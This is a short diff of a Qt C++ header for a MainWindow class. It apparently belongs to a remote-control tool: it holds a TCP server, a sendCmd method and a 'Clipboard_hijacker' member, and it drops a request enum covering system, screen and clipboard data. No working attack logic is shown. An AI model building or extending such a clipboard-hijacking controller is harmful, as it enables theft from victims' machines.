@@ -24,7 +24,6 @@
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
 QT_END_NAMESPACE
-enum DATA_REQUESTER:int {SYS=0, SCR=1, EXT=2, CLP=3, NIL=4};
 
 class MainWindow : public QMainWindow
 {
@@ -36,14 +35,12 @@ public:
     void sendCmd(QString,QTcpSocket* newsocket);
 
 private slots:
-    //void commandReceived();
-    void incommingConnection();
-    void read(QTcpSocket *newsocket);
+    void read();
+    void incomingConnection();
 private:
     QTcpServer *serversocket;
-    QDataStream in;
-    DATA_REQUESTER networdHandler;
     Clipboard_hijacker *clippy = new Clipboard_hijacker();
     Ui::MainWindow *ui;
+    QTcpSocket* currentSocket;
 };
 #endif // MAINWINDOW_H
